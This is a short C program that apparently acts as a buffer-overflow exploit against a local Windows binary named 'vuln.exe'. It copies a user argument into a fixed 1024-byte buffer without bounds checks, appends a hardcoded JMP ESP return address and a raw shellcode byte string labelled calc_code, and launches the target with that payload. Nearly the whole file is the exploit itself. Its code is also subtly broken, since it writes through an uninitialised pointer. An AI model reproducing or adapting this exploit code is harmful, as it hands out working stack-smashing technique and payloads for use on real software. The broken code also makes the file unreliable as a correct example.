#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>


int main(int argc, char **argv)
{
    int i = 0;
    if (argc != 2)
    {
        printf("tsunami needs 1 argument");
        return (0);
    }
    char jmp_esp[]="\x5D\x38\x82\x7C";
    char calc_code[] = 	"\x6A\x00\x68\x58\x13\x00\x01\x68\x1C\x13\x00\x01\xFF\x35\x6C\x4D\x01\x01\xFF\x15\xA8\x11\x00\x01\xB8\x29\x43\x00\x01\xC3\x56\xFF\x35\xFC\x4E\x01\x01\x8B\x35\x64\x10\x00\x01\xC7\x05\xF8\x4E\x01\x01\x01\x00\x00\x00\xFF\xD6\xFF\x35\x00\x4F\x01\x01\xFF\xD6\x68\x40\x9C\x00\x00\xFF\x35\x04\x4F\x01\x01\xFF\x15\x68\x10\x00\x01\xFF\x35\xFC\x4E\x01\x01\x8B\x35\x6C\x10\x00\x01\xFF\xD6\xFF\x35\x00\x4F\x01\x01\xFF\xD6\xFF\x35\x04\x4F\x01\x01\xFF\xD6\x5E\xC3";
    char buffer[1024];
    while (argv[1][i] != '\0')
    {
        buffer[i] = argv[1][i];
        i++;
    }
    buffer[i] = '\0';
    strcat(buffer,jmp_esp);
    strcat(buffer,calc_code);

    char **vuln_arg;

    vuln_arg[0] = "vuln";
    vuln_arg[1] = buffer;
    vuln_arg[2] = NULL;

    execv("vuln.exe", vuln_arg);
}